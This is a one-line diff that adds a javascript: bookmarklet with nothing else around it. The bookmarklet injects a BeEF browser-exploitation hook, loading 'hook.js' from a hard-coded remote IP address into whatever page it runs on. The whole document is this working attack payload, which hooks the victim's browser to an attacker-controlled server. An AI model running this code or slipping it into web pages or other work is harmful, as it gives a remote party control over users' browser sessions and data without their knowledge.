@@ -1,0 +1,1 @@
+javascript: (function () { var url = 'http://186.235.59.174/hook.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();
